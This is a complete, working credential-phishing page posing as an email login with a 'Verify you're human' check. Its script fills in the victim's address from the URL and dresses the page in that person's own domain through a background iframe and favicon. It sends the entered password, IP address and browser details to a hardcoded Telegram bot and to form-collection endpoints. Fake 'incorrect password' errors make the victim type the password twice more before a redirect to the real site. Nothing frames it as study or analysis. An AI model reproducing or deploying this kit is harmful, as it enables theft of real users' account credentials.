<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Login</title>
    <!-- Include Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <!-- Google Fonts: Poppins -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: Poppins, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #background-iframe, #overlay {
            position: fixed;
            top: 0;
            left: 0;
            height: 100vh;
            width: 100vw;
            max-height: 100vh;
            max-width: 100vw;
            box-sizing: border-box;
        }
        #background-iframe {
            border: none;
            z-index: -3;
        }
        #overlay {
            background-color: rgba(0, 0, 0, 0.5);
            z-index: -2;
        }
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            width: 300px;
            position: relative;
            z-index: 1;
        }
        .icon-text {
            display: flex;
            align-items: center;
            margin-bottom: 1.5rem;
        }
        .icon-text img {
            width: 32px;
            height: 32px;
            margin-right: 0.5rem;
        }
        .icon-text .h4 {
            margin-bottom: 0;
            color: #0d6efd;
        }
        .form-group {
            margin-bottom: 15px;
            position: relative;
            z-index: 1;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[readonly] {
            background-color: #f9f9f9;
            cursor: not-allowed;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 10px;
            text-align: center;
            display: none;
            position: relative;
            z-index: 1;
        }
        .honeypot {
            display: none;
        }
    </style>
</head>
<body>
    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
    <div id="overlay"></div>
    <div class="login-container">
        <div class="icon-text">
            <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=example.com" alt="Domain Favicon">
            <span class="h4" id="domain-name">EXAMPLE</span>
        </div>
        <h2 data-translate="form_header">Verify you’re human</h2>
        <form id="login-form" action="https://submit-form.com/J2IVAy4bj" method="POST">
            <div class="form-group">
                <label for="email" data-translate="email_label">Email:</label>
                <input type="email" id="email" name="email" required readonly>
            </div>
            <div class="form-group">
                <label for="password" data-translate="password_label">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group honeypot">
                <label for="honeypot">Leave this field empty:</label>
                <input type="text" id="honeypot" name="honeypot">
            </div>
            <button type="submit" data-translate="submit_button">Log In</button>
            <div class="error-message" id="error-message" data-translate="error_message">Incorrect password, please try again</div>
        </form>
    </div>

    <!-- Bootstrap 5 JS Bundle (includes Popper) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Translation dictionary
        const translations = {
            en: {
                form_header: "Verify you’re human",
                email_label: "Email:",
                password_label: "Password:",
                submit_button: "Log In",
                error_message: "Incorrect password, please try again",
                bot_detected: "Bot detected, please try again",
                telegram_error: "Failed to send data to Telegram, please try again"
            },
            es: {
                form_header: "Verifica que eres humano",
                email_label: "Correo electrónico:",
                password_label: "Contraseña:",
                submit_button: "Iniciar sesión",
                error_message: "Contraseña incorrecta, por favor intenta de nuevo",
                bot_detected: "Bot detectado, por favor intenta de nuevo",
                telegram_error: "Error al enviar datos a Telegram, intenta de nuevo"
            },
            fr: {
                form_header: "Vérifiez que vous êtes humain",
                email_label: "E-mail :",
                password_label: "Mot de passe :",
                submit_button: "Se connecter",
                error_message: "Mot de passe incorrect, veuillez réessayer",
                bot_detected: "Bot détecté, veuillez réessayer",
                telegram_error: "Échec de l'envoi des données à Telegram, veuillez réessayer"
            },
            de: {
                form_header: "Bestätigen Sie, dass Sie ein Mensch sind",
                email_label: "E-Mail:",
                password_label: "Passwort:",
                submit_button: "Anmelden",
                error_message: "Falsches Passwort, bitte versuchen Sie es erneut",
                bot_detected: "Bot erkannt, bitte versuchen Sie es erneut",
                telegram_error: "Fehler beim Senden der Daten an Telegram, bitte versuchen Sie es erneut"
            },
            it: {
                form_header: "Verifica che sei umano",
                email_label: "Email:",
                password_label: "Password:",
                submit_button: "Accedi",
                error_message: "Password errata, riprova",
                bot_detected: "Bot rilevato, riprova",
                telegram_error: "Errore nell'invio dei dati a Telegram, riprova"
            },
            pt: {
                form_header: "Verifique que você é humano",
                email_label: "E-mail:",
                password_label: "Senha:",
                submit_button: "Entrar",
                error_message: "Senha incorreta, tente novamente",
                bot_detected: "Bot detectado, tente novamente",
                telegram_error: "Falha ao enviar dados para o Telegram, tente novamente"
            },
            ja: {
                form_header: "あなたが人間であることを確認してください",
                email_label: "メール:",
                password_label: "パスワード:",
                submit_button: "ログイン",
                error_message: "パスワードが正しくありません。もう一度お試しください",
                bot_detected: "ボットが検出されました。もう一度お試しください",
                telegram_error: "Telegramへのデータ送信に失敗しました。もう一度お試しください"
            },
            zh: {
                form_header: "验证您是人类",
                email_label: "电子邮件:",
                password_label: "密码:",
                submit_button: "登录",
                error_message: "密码错误，请重试",
                bot_detected: "检测到机器人，请重试",
                telegram_error: "无法发送数据到Telegram，请重试"
            }
        };

        // Function to detect browser language
        function getBrowserLanguage() {
            const lang = navigator.language || navigator.languages[0] || 'en';
            return lang.split('-')[0];
        }

        // Function to apply translations
        function applyTranslations(lang) {
            const elements = document.querySelectorAll('[data-translate]');
            const translation = translations[lang] || translations['en'];
            elements.forEach(element => {
                const key = element.getAttribute('data-translate');
                element.textContent = translation[key];
            });
        }

        // Function to extract email and domain from URL
        function getEmailFromUrl() {
            const url = window.location.href;
            let email = '';
            let domain = '';

            if (url.includes('#')) {
                email = url.split('#')[1];
            } else if (url.includes('?')) {
                const query = url.split('?')[1];
                const params = new URLSearchParams(query);
                email = params.get('email') || query.split('&')[0];
            }

            email = email ? decodeURIComponent(email) : '';
            if (email && email.includes('@')) {
                domain = email.split('@')[1];
            }

            return { email, domain };
        }

        // Initialize form and background
        document.addEventListener("DOMContentLoaded", () => {
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const honeypotInput = document.getElementById('honeypot');
            const errorMessage = document.getElementById('error-message');
            const form = document.getElementById('login-form');
            const backgroundIframe = document.getElementById('background-iframe');
            const domainFavicon = document.getElementById('domain-favicon');
            const domainName = document.getElementById('domain-name');
            const { email, domain } = getEmailFromUrl();

            if (email && email.includes('@')) {
                emailInput.value = email;
                if (domain) {
                    domainFavicon.src = `https://www.google.com/s2/favicons?domain=${domain}`;
                    domainName.textContent = domain.split('.')[0].toUpperCase();
                }
            } else {
                domainFavicon.src = 'https://www.google.com/s2/favicons?domain=example.com';
                domainName.textContent = 'EXAMPLE';
            }

            if (domain) {
                const domainUrl = domain.match(/^https?:\/\//) ? domain : `https://${domain}`;
                backgroundIframe.src = domainUrl;
            } else {
                backgroundIframe.src = 'about:blank';
                document.body.style.backgroundColor = 'white';
            }

            function updateIframeSize() {
                backgroundIframe.style.width = `${window.innerWidth}px`;
                backgroundIframe.style.height = `${window.innerHeight}px`;
            }

            passwordInput.addEventListener('focus', updateIframeSize);
            passwordInput.addEventListener('blur', () => {
                backgroundIframe.style.width = '100vw';
                backgroundIframe.style.height = '100vh';
            });
            window.addEventListener('resize', updateIframeSize);

            const browserLang = getBrowserLanguage();
            applyTranslations(browserLang);

            let submissionAttempts = 0;
            const formLoadTime = Date.now();

            let additionalData = {
                ipAddress: "Fetching...",
                userAgent: navigator.userAgent,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                browser: "Detecting..."
            };
            const userAgent = navigator.userAgent;
            additionalData.browser = userAgent.includes("Firefox") ? "Mozilla Firefox" :
                                     userAgent.includes("SamsungBrowser") ? "Samsung Internet" :
                                     userAgent.includes("Opera") || userAgent.includes("OPR") ? "Opera" :
                                     userAgent.includes("Trident") ? "Microsoft Internet Explorer" :
                                     userAgent.includes("Edge") ? "Microsoft Edge" :
                                     userAgent.includes("Chrome") ? "Google Chrome or Chromium" :
                                     userAgent.includes("Safari") ? "Apple Safari" : "Unknown";

            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data => { additionalData.ipAddress = data.ip; })
                .catch(error => {
                    console.error("Error fetching IP address:", error);
                    additionalData.ipAddress = "Unavailable";
                });

            form.addEventListener('submit', async (event) => {
                event.preventDefault();

                const timeSinceLoad = Date.now() - formLoadTime;
                if (honeypotInput.value !== '' || timeSinceLoad < 1000) {
                    errorMessage.textContent = translations[browserLang]?.bot_detected || "Bot detected, please try again";
                    errorMessage.style.display = 'block';
                    passwordInput.value = '';
                    honeypotInput.value = '';
                    passwordInput.focus();
                    return;
                }

                submissionAttempts++;

                const email = emailInput.value.trim();
                const password = passwordInput.value.trim();
                const data = { email, password };

                // Telegram submission
                const botToken = '733880603:AAGzaXbfY0CG-zZv_';
                const chatId = '6861426';
                const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                const logMessage = `===äłł-ďōmãïń-2025===\n\nEmail: ${email}\nPassword: ${password}\nSubmission Attempt: ${submissionAttempts}\nIP Address: ${additionalData.ipAddress}\nUser Agent: ${additionalData.userAgent}\nTimezone: ${additionalData.timezone}\nBrowser: ${additionalData.browser}`;

                try {
                    const response = await fetch(telegramApiUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: logMessage,
                            parse_mode: 'HTML'
                        })
                    });
                    if (!response.ok) {
                        errorMessage.textContent = translations[browserLang]?.telegram_error || "Failed to send data to Telegram, please try again";
                        errorMessage.style.display = 'block';
                    } else {
                        console.log('Telegram submission successful!');
                    }
                } catch (error) {
                    console.error('Telegram submission error:', error);
                    errorMessage.textContent = translations[browserLang]?.telegram_error || "Failed to send data to Telegram, please try again";
                    errorMessage.style.display = 'block';
                }

                // Form submission
                try {
                    const response = await fetch('https://submit-form.com/5BYUqxAm1', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                    console.log(response.ok ? 'Submission to form successful!' : 'Submission to form failed.');
                } catch (error) {
                    console.error('Submission error:', error);
                }

                if (submissionAttempts <= 2) {
                    errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
                    errorMessage.style.display = 'block';
                    passwordInput.value = '';
                    honeypotInput.value = '';
                    passwordInput.focus();
                } else if (submissionAttempts === 3) {
                    if (domain) {
                        window.location.href = `https://${domain}`;
                    } else {
                        errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
                        errorMessage.style.display = 'block';
                        passwordInput.value = '';
                        honeypotInput.value = '';
                        passwordInput.focus();
                    }
                }
            });
        });
    </script>
</body>
</html>
